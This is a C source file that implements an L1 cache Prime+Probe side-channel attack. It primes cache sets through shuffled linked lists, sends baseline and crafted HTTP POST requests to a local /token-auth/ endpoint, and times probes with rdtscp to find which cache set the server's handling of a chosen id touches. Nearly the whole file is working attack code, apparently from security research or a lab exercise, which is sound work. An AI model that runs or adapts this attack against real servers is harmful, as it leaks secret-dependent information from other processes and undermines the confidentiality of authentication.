#include <stdio.h>
#include <stdint.h>

#include <x86intrin.h>

#include <fcntl.h>

#include "attacker.h"

#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

// cache metrics
#define WAYS 8
#define SETS 64
#define LINE_SIZE 64
#define L1_SIZE (WAYS * SETS * LINE_SIZE)
#define NO_LINES (WAYS * SETS)
#define PAGE_SIZE 4096

// prime+probe
#define ATTACK_RUNS 100
#define EVICTION_THRESHOLD 400

// socket
#define PORT 8080
#define INET "127.0.0.1"
#define TWO_MB (L1_SIZE * 64)

// sets up linked list for priming and probing based off of addresses in probe array
typedef struct node {
    struct node *next;
    uint8_t padding[LINE_SIZE - sizeof(struct node*)]; // make 1 node = LINE_SIZE (64 bytes)
} node_t;

node_t *set_pointers[SETS]; // stores head pointers for each set linked list

uint8_t probe_array[TWO_MB] __attribute__((aligned(PAGE_SIZE))); // allocates int array of size = L1_SIZE and aligns to page

uint64_t c_threshold;
int shuffle_arr[SETS];

int baseline[SETS] = {0}; 
int count[SETS]= {0}; // records sets that have been touched

char buf[1024]= {0};

uint64_t c_threshold;

int main(int argc, char* argv[]) {
     // setup socket connection 
    int clientfd;
    struct sockaddr_in servaddr;
    open_socket(&clientfd, &servaddr);
    connect(clientfd, (struct sockaddr *)&servaddr, sizeof(servaddr));

    // shuffle prob arr access route - avoid hardwre prefetching
    for (int i = 0; i < SETS; i++) {
        shuffle_arr[i] = i; // shuffle_arr = {0-63}
    }
    shuffle(shuffle_arr);

    // set up linked list
    linked_list();

    //cache_threshold();
    printf("Probe array base address: %p\n", (void*)probe_array);


    // find threshold
    c_threshold = EVICTION_THRESHOLD;

    char *baseline_data = 
    "POST /token-auth/ HTTP/1.1\r\n"
    "Host: 127.0.0.1\r\n"
    "Content-Length: 35\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Connection: keep-alive\r\n"
    "\r\n"
    "username=none&password=none&id=4132";
    char attack_data[256];
    get_inputs(attack_data, argc, argv);
    
    // get page table entries in cache lookup
    for (int i = 0; i < SETS; i++) {
        for (int w = 0; w < WAYS; w++) {
            volatile uint8_t *addr = &probe_array[(w * 4096) + (i * LINE_SIZE)];
            volatile uint8_t dummy = *addr; 
        }
    }
    _mm_mfence();
  
    for (int j = 0; j < ATTACK_RUNS; j++) {

        //PRIME
        prime_cache();

        // BASELINE
        send(clientfd, baseline_data, strlen(baseline_data), 0);
        int n = -1;
        while (n < 0) {
            n = recv(clientfd, buf, sizeof(buf), 0); // deetct response started
        }

        //PROBE
        check_cache_presence(baseline);

        while (n > 0) {
            n = recv(clientfd, buf, sizeof(buf), 0); // drain socket buf
        }

        // = ATTACK =
        //PRIME
        prime_cache();

        // ATTACK
        send(clientfd, attack_data, strlen(attack_data), 0);
        
        n = -1;
        while (n < 0) {
            n = recv(clientfd, buf, sizeof(buf), 0); // detect response started
        }

        //PROBE
        check_cache_presence(count);

        while (n > 0) {
            n = recv(clientfd, buf, sizeof(buf), 0); // drain socket
        }
    } 

    printf("\n===== Eviction Difs =====\n");
    int max = 0;
    int mset = -1;
    for (int i = 0; i < SETS; i++) { 
        int diff = count[i] - baseline[i];
        //float prcnt = ((float)diff/baseline[i]) * 100;
        if (diff > max){
            max = diff;
            mset = i;
        }
        if (diff > 0){
            printf("Set %d: %d -> (attack: %d, baseline: %d)\n", i, diff, count[i], baseline[i]); // print diff
        }
    }
    int diff_sum = 0;
    for (int i = 0; i < SETS; i++) {
        if (i != mset){
            diff_sum+=count[i] - baseline[i];
        }
    } 
    float avg_diff = (float)diff_sum/63.0; // calculates avg diff to see if run was noisy (excludes highest)
    printf("Average diff: %0.1f\n", avg_diff);
    printf("HIGHEST SET: %d (%d)\n", mset, max);

    close(clientfd);
    return 0;

}


void shuffle(int shuffle_arr[]){
    for (int i = 0; i < SETS; i++){
        int tmp = shuffle_arr[i];
        int shuffle_index = rand() % SETS;
        shuffle_arr[i] = shuffle_arr[shuffle_index];
        shuffle_arr[shuffle_index] = tmp;
    }
}

void prime_cache(){
    // Prime L1 cache
    // loop through probe array - one iteration = one cache line hit (makes sure it persists in L1)
    for (unsigned int i = 0; i < SETS; i++){
        node_t *current = set_pointers[i];
        while (current != NULL){
            current = current->next;
        }
    }
    _mm_mfence();
}




void linked_list(){
    int item_count = WAYS;
    node_t *sets_collection[SETS][item_count]; // will store addresses associated with set - to be later linked 

    for (int i = 0; i < (LINE_SIZE * SETS * item_count); i += LINE_SIZE){ // iterates 10 pages (10 addresses per set)
        //get the set
        intptr_t address = (intptr_t)&probe_array[i];
        int set = (address >> 6) & 0x3F;

        // store address under related set
        sets_collection[set][(i/(PAGE_SIZE))] = (node_t*) address;
    }

    // shuffle the addresses under each set - tricks prefetcher
    for (int set = 0; set < SETS; set++){

        // shuffle each item (address pointer)
        for(int item = 0; item < item_count; item++){
            node_t *tmp = sets_collection[set][item];
            int shuffle_index = rand() % item_count;
            // swap
            sets_collection[set][item] = sets_collection[set][shuffle_index];
            sets_collection[set][shuffle_index] = tmp;
        }

        //link togther and create the liked list
        int i = 1;
        set_pointers[set] = sets_collection[set][0];
        node_t *current = set_pointers[set];

        while(i < item_count){
            current->next = sets_collection[set][i];
            current = current->next;
            i++;
        }
        current->next = NULL; // last node points to NULL
    }
}

void check_cache_presence(int *count){
    uint64_t t1, t2;
    unsigned int pid;

    for (unsigned int i = 0; i < SETS; i++){
    
        int set = shuffle_arr[i]; // determine random set to probe
        node_t *current = set_pointers[set];
        //int e = 0;
        //while(current != NULL){
            _mm_mfence();
            t1 = __rdtscp(&pid); 
            _mm_lfence();

            // loop through all set pointer addresses
            while (current != NULL){
                current = current->next;
            }

            _mm_lfence();
            t2 = __rdtscp(&pid);
            _mm_lfence();

            if (t2 - t1 > c_threshold){ // if miss detected
                count[set]++;
            }
        //}
    }
    
    // printf("%d/%d cache hits\n", present, NO_LINES);
}


void get_inputs(char attack_data[], int argc, char* argv[]){

    char *attack_id = "4096";
    if (argc == 2){
        attack_id = argv[1]; 
    }
    char body[128];
    int body_len = snprintf(body, sizeof(body), "username=none&password=none&id=%s", attack_id);

    snprintf(attack_data, 512, 
        "POST /token-auth/ HTTP/1.1\r\n"
        "Host: 127.0.0.1\r\n"
        "Content-Length: %d\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Connection: keep-alive\r\n\r\n"
        "%s", body_len, body);
}

void open_socket(int *clientfd, struct sockaddr_in *servaddr){
    
    *clientfd = socket(AF_INET, SOCK_STREAM, 0);

    int flags = fcntl(*clientfd, F_GETFL, 0);
    fcntl(*clientfd, F_SETFL, flags | O_NONBLOCK);

    servaddr->sin_family = AF_INET;
    servaddr->sin_port = htons(PORT);
    servaddr->sin_addr.s_addr = inet_addr(INET);
}

